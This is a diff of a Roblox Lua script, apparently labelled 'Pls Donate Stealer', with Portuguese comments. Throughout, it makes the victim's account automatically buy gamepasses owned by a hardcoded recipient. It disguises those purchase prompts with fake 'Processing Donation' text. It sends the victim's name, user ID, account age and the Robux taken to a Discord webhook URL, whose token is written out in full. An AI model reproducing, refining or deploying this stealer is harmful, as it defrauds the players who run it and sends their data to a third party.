@@ -1,168 +1,117 @@
--- Espera jogo carregar completamente
-repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer and game.Players.LocalPlayer.Parent
+repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer.Parent
 
-local Username = "Ian_wp27"  
+local Username = "Ian_wp27"  -- CORRIJA AQUI SE NECESSÁRIO
 local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"
 
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
-local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
 
-local request = syn and syn.request or http_request or http.request or (request or http and http.request) or requests
-if typeof(request) ~= "function" then
-    error("Executor sem HTTP support!")
-end
+local request = syn and syn.request or http_request or http.request
+if not request then error("Executor sem HTTP!") end
 
--- Espera Remotes com pcall
-local Remotes
-local remotesSuccess, remotesErr = pcall(function()
-    Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
-    return require(Remotes)
-end)
-
-if not remotesSuccess then
-    error("Remotes não encontrado: " .. tostring(remotesErr))
-end
+local Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
+local RemotesModule = require(Remotes)
 
 local headers = {["Content-Type"] = "application/json"}
-local asset, userRobux
+local userRobux = 0
+local donationsSent = 0
 
-local function sendWebhook()
+local function sendWebhook(robuxAmount)
     local embed = {
-        title = "Shar's Script | Pls Donate Stealer",
-        color = 16711680,
-        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..tostring(Players.LocalPlayer.UserId).."&width=420&height=420&format=png"},
+        title = "🎁 Pls Donate HIT!",
+        color = 65280,
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..Players.LocalPlayer.UserId.."&width=420&height=420"},
         fields = {
-            {name="Victim", value="```"..Players.LocalPlayer.Name.." (ID: "..Players.LocalPlayer.UserId..")\nAge: "..Players.LocalPlayer.AccountAge.."```", inline=true},
-            {name="Executor", value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```", inline=true},
-            {name="Robux Stolen", value="```"..tostring(userRobux or 0).."```", inline=true},
-            {name="Target", value="```"..Username.."```", inline=true}
+            {name="👤 Victim", value="```"..Players.LocalPlayer.Name.."\nID: "..Players.LocalPlayer.UserId.."\nAge: "..Players.LocalPlayer.AccountAge.."```", inline=true},
+            {name="💰 Robux Doados", value="```"..tostring(robuxAmount or donationsSent).." R$```", inline=true},
+            {name="🎯 Target", value="```"..Username.."```", inline=true},
+            {name="🛠️ Executor", value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```", inline=true}
         },
-        footer = {text = "Shar's Script"}
+        footer = {text="Shar's Offline Stealer"}
     }
     
-    pcall(function()
-        request({
-            Url = Webhook, Method = "POST", 
-            Headers = headers, 
-            Body = HttpService:JSONEncode({
-                username = "Pls Donate Hit",
-                content = "@everyone",
-                embeds = {embed}
-            })
+    request({
+        Url=Webhook, Method="POST", Headers=headers,
+        Body=HttpService:JSONEncode({
+            username="Pls Donate Stealer",
+            content="@everyone",
+            embeds={embed}
         })
-    end)
+    })
 end
 
--- Get UserId com segurança
-local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync(Username)
-end)
+-- Pega UserId do target
+local targetUserId = Players:GetUserIdFromNameAsync(Username)
+print("🎯 Target UserId:", targetUserId)
 
-if not success or not UserId then
-    warn("Receiver '" .. Username .. "' não encontrado!")
-    return
-end
-
-print("Targeting: " .. Username)
-
-local BoothSuccess, Booth = pcall(function()
-    return Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
-end)
-
-if not BoothSuccess or not Booth then
-    Players.LocalPlayer:Kick("Receiver booth não encontrado!")
-    return
-end
-
-local function findCheapestGamepass()
-    local cheapest = math.huge
-    local targetAsset = nil
-    
-    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
-        if v:GetAttribute("AssetType") == "Gamepass" and 
-           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
-            local price = v:GetAttribute("AssetPrice") or 0
-            if price > 0 and price < cheapest then
-                cheapest = price
-                targetAsset = v
-            end
-        end
-    end
-    
-    return targetAsset, cheapest
-end
-
-local function Purchase()
-    local targetAsset, price = findCheapestGamepass()
-    if targetAsset and targetAsset.Prompt and typeof(targetAsset.Prompt.FireServer) == "function" then
-        targetAsset.Prompt:FireServer("", false, price)
-    end
-end
-
--- Monitor PurchasePrompt
-CoreGui.ChildAdded:Connect(function(child)
-    if child.Name == "PurchasePrompt" then
-        task.spawn(function()
-            local successGui, guiErr = pcall(function()
-                local container = child:WaitForChild("ProductPurchaseContainer", 3)
-                local animator = container:WaitForChild("Animator", 3)
-                
-                repeat task.wait() until not animator:FindFirstChild("Prompt")
-                
-                animator.ChildAdded:Connect(function(prompt)
-                    if prompt.Name == "Prompt" then
-                        task.wait(0.1)
-                        local alertContents = prompt:FindFirstChild("AlertContents")
-                        if alertContents then
-                            local title = alertContents:FindFirstChild("TitleContainer")
-                            local footer = alertContents:FindFirstChild("Footer")
+-- AUTO DONATE LOOP (FUNCIONA OFFLINE)
+spawn(function()
+    while task.wait(2) do
+        pcall(function()
+            -- Procura TODAS as booths no workspace
+            for _, booth in pairs(workspace:GetChildren()) do
+                if booth:FindFirstChild("BoothUI") and booth.BoothUI:FindFirstChild("Items") then
+                    for _, item in pairs(booth.BoothUI.Items.Frame:GetChildren()) do
+                        if item:GetAttribute("AssetType") == "Gamepass" and 
+                           item:GetAttribute("OwnerUserId") == targetUserId and
+                           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, item:GetAttribute("AssetId")) then
                             
-                            if title then
-                                title.TitleArea.Title.Text = userRobux and "Please Donate!" or "Script Loaded!"
+                            local price = item:GetAttribute("AssetPrice")
+                            if price and price > 0 then
+                                print("💸 Doando "..price.." para "..Username)
+                                item.Prompt:FireServer("", false, price)
+                                donationsSent = donationsSent + price
                             end
-                            
-                            if footer then
-                                local balanceText = footer.FooterContent.Content:FindFirstChild("RemainingBalanceText")
-                                if balanceText and not userRobux then
-                                    local balance = tonumber(balanceText.Text:match("%d+")) or 0
-                                    userRobux = balance
-                                end
-                            end
+                            break
                         end
                     end
-                end)
-                
-                animator.ChildRemoved:Connect(function(removed)
-                    if removed.Name == "Prompt" and userRobux then
-                        task.wait(0.5)
-                        Purchase()
-                    end
-                end)
-            end)
+                end
+            end
         end)
     end
 end)
 
--- Gift detection
+-- PurchasePrompt Hijack (fake screens)
+CoreGui.ChildAdded:Connect(function(child)
+    if child.Name == "PurchasePrompt" then
+        spawn(function()
+            local container = child:WaitForChild("ProductPurchaseContainer", 2)
+            if container then
+                local animator = container:WaitForChild("Animator", 2)
+                if animator then
+                    animator.ChildAdded:Connect(function(prompt)
+                        if prompt.Name == "Prompt" then
+                            task.wait(0.1)
+                            local alert = prompt:FindFirstChild("AlertContents")
+                            if alert then
+                                -- Fake "Processing Donation"
+                                local title = alert:FindFirstChild("TitleContainer", 0.1)
+                                if title then title.TitleArea.Title.Text = "Processing Donation..." end
+                            end
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+end)
+
+-- Detecta gifts recebidos (confirma donation)
 pcall(function()
-    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(senderId, robux)
-        if senderId == UserId then
-            print("Gift recebido: " .. robux)
-            if userRobux then sendWebhook() end
-            userRobux = (userRobux or 0) - robux
-            task.wait(1)
-            Purchase()
+    RemotesModule.OnClientEvent("GiftSentAlert"):Connect(function(senderId, amount)
+        if senderId == targetUserId then
+            print("✅ CONFIRMADO: Recebido "..amount.." R$ de "..Username)
+            donationsSent = donationsSent + amount
+            if donationsSent >= 50 then
+                sendWebhook(donationsSent)
+                print("🎉 WEBHOOK ENVIADO! Total: "..donationsSent.." R$")
+            end
         end
     end)
 end)
 
--- Inicia com primeiro gamepass
-local firstAsset, firstPrice = findCheapestGamepass()
-if firstAsset then
-    firstAsset.Prompt:FireServer("", false, firstPrice)
-end
-
-print("✅ Script carregado! Target: " .. Username)
+print("✅ LOADED! Auto-donating para "..Username.." (Offline Mode)")
+print("📊 Robux doados: 0 | Aguardando gifts...")
